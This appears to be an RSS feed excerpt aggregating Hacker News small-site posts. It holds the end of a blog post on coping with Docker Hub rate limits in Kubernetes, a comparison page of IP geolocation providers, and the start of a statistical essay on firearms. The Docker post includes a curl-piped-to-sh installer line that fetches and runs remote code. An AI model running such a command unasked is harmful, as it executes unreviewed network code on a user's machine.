<p>That limit of 100 pulls can be extended to 200 pulls, but requires complex configuration of your Kubernetes cluster with <a href="https://kubernetes.io/docs/tasks/configure-pod-container/pull-image-private-registry/">“image pull secrets”</a> in each namespace and each ServiceAccount throughout the cluster. Docker Hub users who pay Docker will be able to pull an unlimited amount of images, without rate-limiting, however this still requires “image pull secrets” to be configured.</p>

<p>You will be able to check your rate-limit level using a new Docker Hub API. Read more: <a href="https://docs.docker.com/docker-hub/download-rate-limit/">Docker Hub Download rate limit</a>.</p>

<h2 id="potential-solutions">Potential solutions</h2>

<p>You will hit the limit, eventually, and so it’s best to prepare yourself and team for that eventually, than to scramble to StackOverflow when that day arrives.</p>

<p>In addition to several alternatives, I want to show you how to use the <a href="https://github.com/alexellis/registry-creds/">registry-creds operator</a> built to help new users learning Kubernetes, and those who are developing images locally.</p>

<h3 id="use-a-local-mirror-of-the-docker-hub">Use a local mirror of the Docker Hub</h3>

<p>Setting up a mirror is fairly straight-forward, but will require additional infrastructure, and storage. Someone will need to own this mirror and baby-sit it, if it crashes or dies, you better hope that it can be restored quickly. For new Kubernetes users, this is going to be an unfortunate burden on your learning curve which is steep enough as it is.</p>

<p>There is an <a href="https://get-arkade.dev/">arkade</a> app for setting up a Docker registry on your own Kubernetes cluster:</p>

<div><div><pre><code>arkade <span>install </span>docker-registry
</code></pre></div></div>

<p>This configuration enables authentication, so that you don’t have to worry about finding out how to do that yourself.</p>

<div><div><pre><code>arkade <span>install </span>docker-registry-ingress <span>\</span>
  <span>--email</span> web@example.com <span>\</span>
  <span>--domain</span> reg.example.com
</code></pre></div></div>

<p>It also has automation to get a TLS certificate set-up, as nobody really wants to mess about with self-signed CAs, do they?</p>

<p>And if you’re running on your own hardware, or on-premises, you can use the <a href="https://github.com/inlets/inlets-operator">inlets-operator</a> to expose it on the Internet securely.</p>

<div><div><pre><code><span>export </span><span>LICENSE</span><span>=</span><span>"INLETS_PRO_LICENSE_JWT"</span>
<span>export </span><span>ACCESS_TOKEN</span><span>=</span><span>$HOME</span>/access-token

arkade <span>install </span>inlets-operator <span>\</span>
 <span>--provider</span> digitalocean <span>\</span>
 <span>--region</span> lon1 <span>\</span>
 <span>--token-file</span> <span>$ACCESS_TOKEN</span> <span>\</span>
 <span>--license</span> <span>$LICENSE</span>
</code></pre></div></div>

<p>See a complete tutorial here for <a href="https://blog.alexellis.io/get-a-tls-enabled-docker-registry-in-5-minutes/">setting up a local Docker registry with a public IP address</a>.</p>

<p>Docker docs: <a href="https://docs.docker.com/registry/recipes/mirror/">Registry as a pull through cache</a></p>

<h3 id="configure-an-image-pull-secret">Configure an image pull secret</h3>

<p>Whether you pay Docker for unlimited pulls, or want to use your free account to bump up to 200 pulls per 6 hours, you’ll need to log in.</p>

<p>This generally consists of three steps:</p>

<p>1) Create an image pull secret in each Kubernetes namespace</p>

<p>From the <a href="https://docs.openfaas.com/deployment/kubernetes/#set-a-custom-imagepullpolicy">OpenFaaS docs</a></p>

<div><div><pre><code>kubectl create secret docker-registry my-private-repo <span>\</span>
    <span>--docker-username</span><span>=</span><span>$DOCKER_USERNAME</span> <span>\</span>
    <span>--docker-password</span><span>=</span><span>$DOCKER_PASSWORD</span> <span>\</span>
    <span>--docker-email</span><span>=</span><span>$DOCKER_EMAIL</span> <span>\</span>
    <span>--namespace</span> openfaas-fn
</code></pre></div></div>

<p>2) Attach the secret to any Service Accounts in each namespace</p>

<div><div><pre><code>kubectl edit serviceaccount default <span>-n</span> openfaas-fn
</code></pre></div></div>

<p>Most users can get away with just editing the <code>default</code> serviceaccount, however if you have more than one serviceaccount you’ll have to edit each of them.</p>

<p>At the bottom of the manifest add:</p>

<div><div><pre><code><span>imagePullSecrets</span><span>:</span>
<span>-</span> <span>name</span><span>:</span> <span>my-private-repo</span>
</code></pre></div></div>

<p>At that point, you can now deploy a container to the <code>openfaas-fn</code> namespace, and as long as the Pod is using the <code>default</code> service account, it will pull from the Docker Hub using the credentials provided in the <code>my-private-repo</code> secret.</p>

<h3 id="use-a-public-docker-hub-mirror">Use a public Docker Hub mirror</h3>

<p>It appears that Google Cloud are offering a mirror of the Docker Hub at <code>mirror.gcr.io</code></p>

<p>So you can change your images as follows:</p>

<pre><code>FROM ubuntu:latest
</code></pre>

<p>to:</p>

<pre><code>FROM mirror.gcr.io/library/ubuntu:latest
</code></pre>

<p>This may be worth while for Google Cloud customers, but read all the terms and conditions before switching over.</p>

<p>See also: <a href="https://cloud.google.com/blog/products/containers-kubernetes/mitigating-the-impact-of-new-docker-hub-pull-request-limits">Google Cloud - Pulling cached Docker Hub images</a></p>

<h3 id="publish-your-own-images-to-another-registry">Publish your own images to another registry</h3>

<p>Since the Docker Hub rate limits pass the burden on to the end-user, and not the maintainers/vendors, you could consider using another registry all-together.</p>

<p>Just be careful that you don’t incur a huge bill. Make sure you know the costs of bandwidth and are aware of any limits that are in place.</p>

<p>The best option at present seems to be <a href="https://github.com/features/packages">GitHub’s container registry (ghcr.io)</a> which offers unlimited pulls of public images. Beware that the original GitHub Package Repository for containers is not the same product, and cannot support multi-arch templates.</p>

<p>On the inlets project we’ve already started publishing an image in GHCR so that users don’t have to contend with this issue.</p>

<p>Before:</p>

<div><div><pre><code>docker pull inlets/inlets-pro:0.7.3
docker pull docker.io/inlets/inlets-pro:0.7.3
</code></pre></div></div>

<blockquote>
  <p>Note that the <code>docker.io</code> prefix is implicit, we are just not use to typing it in.</p>
</blockquote>

<p>After:</p>

<div><div><pre><code>pull ghcr.io/inlets/inlets-pro:0.7.3
</code></pre></div></div>

<p>It’s a little more typing, and maintainers have to change their projects, but this seems like a good balance.</p>

<h2 id="our-solution-for-imagepullsecrets">Our solution for ImagePullSecrets</h2>

<p>Finally, I wanted to introduce our solution for managing ImagePullSecrets. We developed a Kubernetes operator which will propagate your registry credentials, whether for the Docke Hub or some other registry to every namespace in your cluster.</p>

<p>We’re releasing this as a free and open-source project on GitHub and you will be able to pull an image from GHCR to avoid a chicken-and-egg situation.</p>

<ul>
  <li>Star or fork on GitHub: <a href="https://github.com/alexellis/registry-creds">alexellis/registry-creds</a></li>
</ul>

<p><img src="https://github.com/alexellis/registry-creds/blob/master/diagram.jpg?raw=true" alt="Diagram"></p>

<blockquote>
  <p>How it works: an initial secret is created, which is then copied into each namespace, and attached to each ServiceAccount</p>
</blockquote>

<p>Here’s how you can try it out:</p>

<ul>
  <li>Use the arkade tool to download some tools and start a cluster, if you don’t already have one:</li>
</ul>

<div><div><pre><code>curl <span>-SLs</span> https://dl.get-arkade.dev|sh
<span>sudo mv </span>arkade /usr/local/bin/

arkade get kind
arkade get kubectl
kind create cluster
</code></pre></div></div>

<ul>
  <li>Create a secrets file <code>~/.docker-creds</code></li>
</ul>

<div><div><pre><code><span>export </span><span>DOCKER_USERNAME</span><span>=</span>username
<span>export </span><span>DOCKER_PASSWORD</span><span>=</span>password
<span>export </span><span>DOCKER_EMAIL</span><span>=</span>email

<span># Optional</span>
<span>export </span><span>DOCKER_SERVER</span><span>=</span><span>""</span>
</code></pre></div></div>

<ul>
  <li>Install registry-creds with arkade</li>
</ul>

<p>The app applies the manifest for the controller and its CRD called <code>ClusterPullSecret</code> then creates an initial Kubernetes seed secret and attaches it to a new <code>ClusterPullSecret</code>. Of course, if you prefer then you can do all of this manually and there are <a href="https://github.com/alexellis/registry-creds">instructions in the README</a>.</p>

<div><div><pre><code><span>source</span> ~/.docker-creds
arkade <span>install </span>registry-creds <span>--from-env</span>
</code></pre></div></div>

<p>If you prefer, then you can also specify each flag, however be careful of leaking your credentials into your bash history:</p>

<div><div><pre><code>arkade <span>install </span>registry-creds <span>\</span>
  <span>--username</span> <span>"</span><span>${</span><span>DOCKER_USERNAME</span><span>}</span><span>"</span> <span>\</span>
  <span>--password</span> <span>"</span><span>${</span><span>DOCKER_PASSWORD</span><span>}</span><span>"</span> <span>\</span>
  <span>--email</span>  <span>"</span><span>${</span><span>DOCKER_EMAIL</span><span>}</span><span>"</span>
</code></pre></div></div>

<ul>
  <li>Deploy an image</li>
</ul>

<div><div><pre><code>kubectl run nginx-1 <span>--image</span><span>=</span>nginx <span>--port</span><span>=</span>80 <span>--restart</span><span>=</span>Always
</code></pre></div></div>

<p>The image will now be pulled from the Docker Hub using the credentials you specified when installing the registry-creds arkade app.</p>

<p>If you want to prove that the secret is being used, try creating a private container image, and then deploying that with the command above.</p>

<h2 id="wrapping-up">Wrapping up</h2>

<p>In conclusion, there are some changes coming to the Docker Hub that are potentially going to affect every user of container images. Kubernetes users are going to suffer the worst, especially new users who are just starting out on their journey. There are mitigations such as a pull-through and caching registry, which are actually a good idea anyway to make your environment faster. Configuring an ImagePullSecret is likely to be required whatever you decide to do, and the <code>registry-creds</code> operator we created is ready for the task.</p>

<p>Feel free to <a href="https://github.com/alexellis/registry-creds">Star or Fork the registry-creds project on GitHub</a>. Feature requests are welcome.</p>

<p>All the tools mentioned here which are maintained by <a href="https://www.openfaas.com/">OpenFaaS Ltd</a> are multi-arch compatible, so you can run these steps on your home lab, ARM64 server, or on a Raspberry Pi.</p>

<p>You can follow <a href="https://twitter.com/inletsdev">@inletsdev</a> and myself <a href="https://twitter.com/alexellisuk">@alexellisuk</a> on Twitter</p>

<p>You may also like:</p>

<ul>
  <li><a href="https://blog.alexellis.io/get-a-tls-enabled-docker-registry-in-5-minutes/">Get a TLS-enabled Docker registry in 5 minutes</a></li>
  <li><a href="https://opencontainers.org/posts/blog/2020-10-30-consuming-public-content/">Consuming Public Content by opencontainers.org</a></li>
  <li><a href="https://blog.alexellis.io/expose-grafana-dashboards/">Expose your private Grafana devops dashboards with Caddy and TLS</a></li>
</ul>

        </div></div>]]>
            </description>
            <link>https://inlets.dev/blog/2020/10/29/preparing-docker-hub-rate-limits.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-24951563</guid>
            <pubDate>Sat, 31 Oct 2020 14:04:16 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Show HN: Comparison of IP Geolocation services and databases]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 3 (<a href="https://news.ycombinator.com/item?id=24951401">thread link</a>) | @Fileformat
<br/>
October 31, 2020 | https://resolve.rs/ip/geolocation.html | <a href="https://web.archive.org/web/*/https://resolve.rs/ip/geolocation.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
  
  <hr>
  

<p><a href="https://en.wikipedia.org/wiki/Geolocation_software">Geolocating an IP address</a> is not an exact science.  It depends on data collected (or volunteered
    by the community), and needs constant updates.
</p>

<h2>Results for 20.186.10.241</h2>

<p><a href="https://resolve.rs/ip/asn-lookup.html?ip=20.186.10.241">ASN</a>: MICROSOFT-CORP-MSN-AS-BLOCK (8075)</p>

<table>
    <thead>
        <tr>
            <th>Provider</th>
            <th>Results</th>
        </tr>
    </thead>
    <tbody>
        <tr>
            <td><a href="https://www.abstractapi.com/ip-geolocation-api">AbstractAPI</a></td>
            <td id="abstractapi">Pending...</td>
        </tr>
        <tr>
            <td><a href="https://docs.aws.amazon.com/AmazonCloudFront/latest/DeveloperGuide/RequestAndResponseBehaviorCustomOrigin.html#request-custom-headers-behavior">AWS</a></td>
            <td id="aws">Pending...</td>
        </tr>
        <tr>
            <td><a href="https://www.bigdatacloud.com/ip-geolocation-apis">BigDataCloud</a></td>
            <td id="bigdatacloud">Pending...</td>
        </tr>
        <tr>
            <td><a href="https://developer.mozilla.org/en-US/docs/Web/API/Geolocation_API">Browser</a></td>
            <td id="browser"></td>
        </tr>
        <tr>
            <td><a href="https://support.cloudflare.com/hc/en-us/articles/200168236-Configuring-Cloudflare-IP-Geolocation">Cloudflare</a></td>
            <td id="cloudflare">Pending...</td>
        </tr>
        <tr>
            <td><a href="https://developer.fastly.com/reference/vcl/variables/geolocation/">Fastly</a></td>
            <td id="fastly">Pending...</td>
        </tr>
        <tr>
            <td><a href="https://cloud.google.com/appengine/docs/standard/go/reference/request-response-headers">Google AppEngine</a></td>
            <td id="appengine">Pending...</td>
        </tr>
        <tr>
            <td><a href="http://www.hostip.info/use.php">HostIP.info</a></td>
            <td id="hostipinfo">Pending...</td>
        </tr>
        <tr>
            <td><a href="https://ip-api.com/">IP-API</a></td>
            <td id="ip_api">Pending...</td>
        </tr>
        <tr>
            <td><a href="https://ipapi.com/">ipapi</a></td>
            <td id="ipapi">Pending...</td>
        </tr>
        <tr>
            <td><a href="https://ipdata.co/">ipdata</a></td>
            <td id="ipdata">Pending...</td>
        </tr>
        <tr>
            <td><a href="https://ipgeolocation.io/">ipgeolocation</a></td>
            <td id="ipgeolocation">Pending...</td>
        </tr>
        <tr>
            <td><a href="https://ipinfo.io/">ipinfo</a></td>
            <td id="ipinfo">Pending...</td>
        </tr>
        <tr>
            <td><a href="https://ipinsight.io/">ipinsight</a></td>
            <td id="ipinsight">Pending...</td>
        </tr>
        <tr>
            <td><a href="https://ipstack.com/">ipstack</a></td>
            <td id="ipstack">Pending...</td>
        </tr>
        <tr>
            <td><a href="https://labstack.com/">labstack</a></td>
            <td id="labstack">Pending...</td>
        </tr>
        <tr>
            <td><a href="https://tools.keycdn.com/geo">KeyCDN</a></td>
            <td id="keycdn">Pending...</td>
        </tr>
        <tr>
            <td><a href="https://dev.maxmind.com/geoip/geoip2/geolite2/">Maxmind</a></td>
            <td id="maxmind">Boydton, United States: <a href="https://www.openstreetmap.org/?mlat=36.6534&amp;mlon=-78.375&amp;zoom=12">36.6534, -78.375</a></td>
        </tr>
    </tbody>
</table>

<h2>Check a Specific IP Address</h2>



<hr>

<h2 id="ipgeolist">Other IP Geolocation Databases</h2>

<p>
    Note: all pricing is for the lowest service level possible. They all have higher priced options (of course).
    In my testing, a lot of the providers are using the MaxMind database, even if they don't admit it.
</p>

<ul>
    <li><a href="https://www.abstractapi.com/ip-geolocation-api">AbstractAPI</a> - free for 20,000/month non-commercial use only, $9/month for 200,000</li>
    <li><a href="https://github.com/analogic/ipgeo">analogic/ipgeo</a> - free database mapping IP subnet to country, in multiple formats.</li>
    <li><a href="http://www.atelierweb.com/products/ip-locator/">Atelier Web IP Locator</a> - $40 for 50,000 lookups.  Free plan is 200 per 30 days.</li>
    <li><a href="https://docs.aws.amazon.com/AmazonCloudFront/latest/DeveloperGuide/RequestAndResponseBehaviorCustomOrigin.html#request-custom-headers-behavior">AWS</a> - includes HTTP header with country if you are using their CloudFront CDN. <span>browser only</span></li>
    <li><a href="https://www.bigdatacloud.com/">BigDataCloud</a> - free for 10,000/month, then $2/month per 10,000.</li>
    <li><a href="https://developer.mozilla.org/en-US/docs/Web/API/Geolocation_API">Browser</a> - 100% client-side JavaScript, requires a user to accept permissions in a popup window. <span>browser only</span></li>
    <li><a href="https://support.cloudflare.com/hc/en-us/articles/200168236-Configuring-Cloudflare-IP-Geolocation">Cloudflare</a> - includes an HTTP header with Country if you are using their CDN. <span>browser only</span></li>
    <li><a href="https://www.cyscape.com/products/chawk/">CountryHawk</a> (Cyscape) - $669 per server per year</li>
    <li><a href="https://developer.fastly.com/reference/vcl/variables/geolocation/">Fastly</a> - includes HTTP headers with full details, free if you are using their CDN. <span>browser only</span></li>
    <li><a href="https://www.geojs.io/">geojs</a> - free with no rate limits, uses MaxMind data</li>
    <li><a href="https://www.geoplugin.com/">GeoPlugin</a> - free, uses MaxMind data</li>
    <li><a href="https://cloud.google.com/appengine/docs/standard/go/reference/request-response-headers">Google AppEngine</a> - includes HTTP headers with full details if you are hosting with them. <span>browser only</span></li>
    <li><a href="http://www.hostip.info/use.php">HostIP.info</a> - free, and you can download their database, but they recommend MaxMind for higher accuracy</li>
    <li><a href="https://ip-api.com/">ip-api</a>: 45/minute free for non-commercial use (http only!), €13/month for unlimited.</li>
    <li><a href="https://ipapi.com/">ipapi</a>: 10,000/month free, $10/month for 50,000</li>
	<li><a href="https://ifconfig.co/">ipconfig.co</a> - free 1 request/minute.  uses MaxMind data.  source available.
    </li><li><a href="https://ipdata.co/pricing.html">ipdata</a>: 1,500/day free, $10/month for 2,500/day</li>
    <li><a href="https://ipgeolocation.io/pricing.html">ipgeolocation.io</a> - 1,000/day free.  $15/month for 150,000</li>
    <li><a href="https://ipinfo.io/">ipinfo.io</a> - 50,000/month but only for non-commercial use.  $49 for 250,000/month</li>
    <li><a href="https://ipinsight.io/">ipinsight.io</a> - 1,000/day free, $30/month for 10,000/day</li>
    <li><a href="https://www.ip2location.com/">IP2Location</a> - $49 for 100,000 lookups.  They also sell their database(s) for local use.</li>
    <li><a href="http://www.ip2nation.com/">ip2nation</a> - downloadable database, free, only gets the country (which is often good enough!)</li>
    <li><a href="https://ipstack.com/">ipstack</a> 10,000/month free, $10/month for 50,000</li>
    <li><a href="https://tools.keycdn.com/geo">KeyCDN</a> - free but requires a link back to their site.  “includes data from MaxMind”</li>
    <li><a href="https://labstack.com/ip#pricing">LabStack</a> - 10,000/month free, 50,000/month for $7</li>
    <li><a href="https://www.maxmind.com/en/geoip2-precision-services">MaxMind</a> - in addition to their free offering (used above), they have a commercial service that starts at $0.10 per 1,000 lookups.</li>
    <li><a href="https://www.melissa.com/v2/lookups/iplocation/ip/">Melissa</a> - 1,000/free, then $3 per 1,000.</li>
    <li><a href="https://www.home.neustar/security-intelligence/ip-geopoint">UltraGeoPoint</a> (Neustar)- no pricing on website</li>
</ul>

<p>
    <span>browser only</span> means it only looks at the caller's IP address, not an arbitrary address that you pass in.
</p>

<h3>Internet Governing Bodies</h3>
<ul>
    <li><a href="https://search.arin.net/rdap/">ARIN Whois/RDAP lookup</a></li>
    <li><a href="https://apps.db.ripe.net/db-web-ui/query">RIPE Database Query</a></li>
    <li><a href="https://afrinic.net/whois-web/public/query">AFRINIC Query</a></li>
    <li><a href="https://rdap-web.lacnic.net/home">LANIC RDAP Web Client</a> - <a href="https://www.lacnic.net/3106/2/lacnic/ip-geolocation">details</a></li>
</ul>

<h3>To Do</h3>

<ul>
    <li><a href="https://auth0.com/signals/ip">Auth0</a></li>
    <li><a href="https://ipwhois.io/">ipwhois</a> - free for 10,000/month non-commerical, $11/month for 250,000.</li>
    <li><a href="https://ipregistry.co/">ipregistry</a>- free for 100,000/month, then $0.10 per 1,000.</li>
	<li><a href="http://geolocation-db.com/index">GeolocationDB</a></li>
	<li><a href="https://ipinfodb.com/api">IpInfoDB</a> - uses ip2location</li>
	<li><a href="https://developers.google.com/maps/documentation/geolocation/overview">Google Maps</a> - meant to be called with mobile phone info, but will fallback to IP</li>
	<li><a href="http://software77.net/geo-ip/">Software77</a> - downloadable database</li>
    <li><a href="https://docs.microsoft.com/en-us/rest/api/maps/geolocation/getiptolocationpreview">Microsoft Azure Maps</a></li>
</ul>

<h3>More Links</h3>

<ul>
    <li><a href="https://rapidapi.com/blog/ip-geolocation-api/">Top 10 Best IP Geolocation APIs</a> - RapidAPI</li>
    <li><a href="https://geekflare.com/geolocation-ip-api/">10 Best IP Geolocation API to Offer Personalized Content</a> - GeekFlare</li>
    <li><a href="https://medium.com/hackernoon/what-is-the-best-ip-geolocation-api-for-cybersecurity-professionals-87653b625376">11 Best IP Geolocation APIs for Cybersecurity Professionals</a> - Medium/Hackernoon</li>
</ul>



</div></div>]]>
            </description>
            <link>https://resolve.rs/ip/geolocation.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-24951401</guid>
            <pubDate>Sat, 31 Oct 2020 13:41:58 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Firearms by the Numbers]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24951316">thread link</a>) | @lettergram
<br/>
October 31, 2020 | https://austingwalters.com/firearms-by-the-numbers/ | <a href="https://web.archive.org/web/*/https://austingwalters.com/firearms-by-the-numbers/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article id="post-3517">

<div>
<p>Firearms (guns) are one of the hot button issues in the United States and globally. I’m sure it is understandable why — pull the trigger and something dies. Killing is the primary purpose of a firearm. Naturally, this leads many to be fearful of firearms, but should people be fearful?</p>
<p>When I started writing this, I wanted to answer:</p>
<blockquote><p>Are firearms inherently unsafe?</p>
<p>Should firearms be banned, as many believe?</p></blockquote>
<p>It’s quite ambitious. One may believe you can just find an answer on a website / paper somewhere or is obvious. Unfortunately, the reality is far more complicated and has turned this into my longest article to date.</p>
<p>It’s been said,</p>
<blockquote><p>Guns don’t kill people, people kill people. <em>– unknown</em></p></blockquote>
<p>Many agree and many others strongly disagree. That divisiveness has made firearms a political issue, leading to a plethora of bias studies, inaccurate analysis, and more. Thus, to answer these questions I had to go through the data myself; I pulled <a href="#Data_Tooling">data from the CDC, FBI, RAND, Census and others</a> and completed my own analysis.</p>
<p>For those interested, a PDF version of this document you can download here: <a href="https://austingwalters.com/wp-content/uploads/2020/10/Firearms-by-the-Numbers.pdf">Firearms by the Numbers</a>.</p>
<h4>Introduction</h4>
<p>Due to the nature of this analysis, it is important to highlight some items upfront.</p>
<p>1. The United States is often the focus throughout the analysis. This is because the United States has an abundance of firearms, a relatively uniform society and the most available &amp; accurate records.</p>
<p>2. This analysis focuses on general trends. Specific situations vary wildly, even in the same region: country, state, county, city, and neighborhood situations vary. As such, I caution making detailed / specific inference, beyond what the data explicitly shows (in the general case).</p>
<p>3. Some important data is lacking, such as socioeconomic status associated with crimes. This makes it very difficult to isolate confounding factors and leads to confusion / lack of definitive answer(s).</p>
<p>The goal of this analysis was to analyze available (and unbiased) data as in-depth as enabled, with no particular outcome in mind. <em>If new data comes in that materially changes what can be inferred, I’ll attempt to update the analysis.</em> With that in mind, I want to highlight that I dive into demographic information and I found some surprises. Politics seems to stifle this topic and in fact the truth. Instead I went to the data, I hope you can find it as interesting as I do.</p>
<blockquote><p>The truth is not for all men, but only for those who seek it.<br>
– Ayn Rand</p></blockquote>
<p>If anything in this analysis was missed,<strong> please feel free to reach out or leave comments.</strong></p>


<p>Globally, firearms are highly controlled, particularly in the Europe and Asia. In contrast, the United States has more firearms held by it’s citizens than the rest of the world combined.<a href="https://austingwalters.com/wp-content/uploads/2020/10/Estimated-of-Firearm-Allocation-by-Country.png"><img loading="lazy" src="https://austingwalters.com/wp-content/uploads/2020/10/Estimated-of-Firearm-Allocation-by-Country.png" alt="" width="1107" height="687" srcset="https://austingwalters.com/wp-content/uploads/2020/10/Estimated-of-Firearm-Allocation-by-Country.png 1107w, https://austingwalters.com/wp-content/uploads/2020/10/Estimated-of-Firearm-Allocation-by-Country-300x186.png 300w, https://austingwalters.com/wp-content/uploads/2020/10/Estimated-of-Firearm-Allocation-by-Country-1024x635.png 1024w, https://austingwalters.com/wp-content/uploads/2020/10/Estimated-of-Firearm-Allocation-by-Country-768x477.png 768w" sizes="(max-width: 1107px) 100vw, 1107px" data-old-src="//austingwalters.com/wp-content/plugins/a3-lazy-load/assets/images/lazy_placeholder.gif" data-src="https://austingwalters.com/wp-content/uploads/2020/10/Estimated-of-Firearm-Allocation-by-Country.png" data-srcset="https://austingwalters.com/wp-content/uploads/2020/10/Estimated-of-Firearm-Allocation-by-Country.png 1107w, https://austingwalters.com/wp-content/uploads/2020/10/Estimated-of-Firearm-Allocation-by-Country-300x186.png 300w, https://austingwalters.com/wp-content/uploads/2020/10/Estimated-of-Firearm-Allocation-by-Country-1024x635.png 1024w, https://austingwalters.com/wp-content/uploads/2020/10/Estimated-of-Firearm-Allocation-by-Country-768x477.png 768w"></a>The real question — do the number of firearms really matter? From the graph above, it’s clear China, Russia and Iran have a high number of military firearms when compared civilian held firearms (and I suspect most civilian held firearms are former military, in countries such as China, Russia ,Iran, India, etc). In contrast, the “<a href="https://en.wikipedia.org/wiki/Free_World" target="_blank" rel="noopener noreferrer">free world</a>” has an order of magnitude more civilian firearms, when compared to military firearms.</p>
<p>Clearly, what matters to “<a href="https://en.wikipedia.org/wiki/Second_World" target="_blank" rel="noopener noreferrer">second world</a>” is having a large military arsenal, when compared to civilian held firearms.</p>
<p>It can be argued an unarmed society allows the military to impose their will, allowing countries to maintain the status quo and avoiding violent revolutions overthrowing the government.</p>
<h2><span id="Homicides_Firearms_Globally"></span>Homicides &amp; Firearms Globally<span></span></h2>
<p>In the “free world,” the main concern surrounding firearms are homicides &amp; suicides, with homicides being the most concerning. Below is a comparison of homicides by firearm deaths per 100,000 people across the globe.</p>
<p><a href="https://austingwalters.com/wp-content/uploads/2020/10/Homicide-Firearm-Deaths-per-100k-Inhabitants2.png"><img loading="lazy" src="https://austingwalters.com/wp-content/uploads/2020/10/Homicide-Firearm-Deaths-per-100k-Inhabitants2.png" alt="" width="1228" height="677" srcset="https://austingwalters.com/wp-content/uploads/2020/10/Homicide-Firearm-Deaths-per-100k-Inhabitants2.png 1228w, https://austingwalters.com/wp-content/uploads/2020/10/Homicide-Firearm-Deaths-per-100k-Inhabitants2-300x165.png 300w, https://austingwalters.com/wp-content/uploads/2020/10/Homicide-Firearm-Deaths-per-100k-Inhabitants2-1024x565.png 1024w, https://austingwalters.com/wp-content/uploads/2020/10/Homicide-Firearm-Deaths-per-100k-Inhabitants2-768x423.png 768w" sizes="(max-width: 1228px) 100vw, 1228px" data-old-src="//austingwalters.com/wp-content/plugins/a3-lazy-load/assets/images/lazy_placeholder.gif" data-src="https://austingwalters.com/wp-content/uploads/2020/10/Homicide-Firearm-Deaths-per-100k-Inhabitants2.png" data-srcset="https://austingwalters.com/wp-content/uploads/2020/10/Homicide-Firearm-Deaths-per-100k-Inhabitants2.png 1228w, https://austingwalters.com/wp-content/uploads/2020/10/Homicide-Firearm-Deaths-per-100k-Inhabitants2-300x165.png 300w, https://austingwalters.com/wp-content/uploads/2020/10/Homicide-Firearm-Deaths-per-100k-Inhabitants2-1024x565.png 1024w, https://austingwalters.com/wp-content/uploads/2020/10/Homicide-Firearm-Deaths-per-100k-Inhabitants2-768x423.png 768w"></a>When we compare the world, a few things become clear:</p>
<ol>
<li>The America’s, Caribbean and Africa have a much higher firearm homicide rate</li>
<li>The United States has the highest firearm homicide rate of a “<a href="https://en.wikipedia.org/wiki/First_World" target="_blank" rel="noopener noreferrer">first world</a>” country</li>
<li>Europe has the lowest firearm homicide rate globally</li>
</ol>
<p>What’s not clear, is whether or not firearms are really leading the increased firearm homicide rate.</p>
<p>Are homicides just naturally higher in these regions?</p>
<h2><span id="Firearm_Death_Rate_per_Firearm"></span>Firearm Death Rate per Firearm<span></span></h2>
<p>Below is an argument from the Amnesty International’s website:</p>
<blockquote><p>governments [with] poor regulation of the possession and use of <strong>guns lead to violence</strong> and that they must tackle this now through strict controls on guns and effective interventions in communities suffering high levels of gun violence.</p>
<p>– <a href="https://www.amnesty.org/en/what-we-do/arms-control/gun-violence/" target="_blank" rel="noopener noreferrer">Amnesty International</a></p></blockquote>
<p>The key statement is:</p>
<blockquote><p>Guns lead to violence</p></blockquote>
<p>The statement above implies a couple of things:</p>
<ol>
<li>Gun volume and violence are correlated</li>
<li>As the number of guns increase, violence increases</li>
</ol>
<p>There are a few ways to invalidate / validate this statement. The clearest method is to simply compare firearm deaths per firearm. If firearms lead to more violence, we should see the ratio of firearm deaths to firearms (firearm deaths / firearms) staying constant (or growing at a constant rate). This ratio should stay or grow at a constant rate because as the firearm count increases, the firearm homicides should increase (keeping the ratio constant). We could also assume a direct correlation if “guns lead to violence” as it would probably occur at some constant rate.</p>
<p>Below you can see the comparison between firearm deaths and firearms:</p>
<p><a href="https://austingwalters.com/wp-content/uploads/2020/10/Firearm-Deaths-Per-Firearm-by-Country5.png"><img loading="lazy" src="https://austingwalters.com/wp-content/uploads/2020/10/Firearm-Deaths-Per-Firearm-by-Country5.png" alt="" width="1313" height="687" srcset="https://austingwalters.com/wp-content/uploads/2020/10/Firearm-Deaths-Per-Firearm-by-Country5.png 1313w, https://austingwalters.com/wp-content/uploads/2020/10/Firearm-Deaths-Per-Firearm-by-Country5-300x157.png 300w, https://austingwalters.com/wp-content/uploads/2020/10/Firearm-Deaths-Per-Firearm-by-Country5-1024x536.png 1024w, https://austingwalters.com/wp-content/uploads/2020/10/Firearm-Deaths-Per-Firearm-by-Country5-768x402.png 768w" sizes="(max-width: 1313px) 100vw, 1313px" data-old-src="//austingwalters.com/wp-content/plugins/a3-lazy-load/assets/images/lazy_placeholder.gif" data-src="https://austingwalters.com/wp-content/uploads/2020/10/Firearm-Deaths-Per-Firearm-by-Country5.png" data-srcset="https://austingwalters.com/wp-content/uploads/2020/10/Firearm-Deaths-Per-Firearm-by-Country5.png 1313w, https://austingwalters.com/wp-content/uploads/2020/10/Firearm-Deaths-Per-Firearm-by-Country5-300x157.png 300w, https://austingwalters.com/wp-content/uploads/2020/10/Firearm-Deaths-Per-Firearm-by-Country5-1024x536.png 1024w, https://austingwalters.com/wp-content/uploads/2020/10/Firearm-Deaths-Per-Firearm-by-Country5-768x402.png 768w"></a>As seen in the chart, the Caribbean, South America, Africa have a high number of firearm deaths per firearm, Columbia having one death per five hundred firearms. In contrast, “First World” (Europe and the United States) has a much lower number of fatalities per firearm, the United States having only one death per ten thousand firearms.</p>
<h3><span id="Firearms_vs_Homicide_Rate"></span>Firearms vs Homicide Rate<span></span></h3>
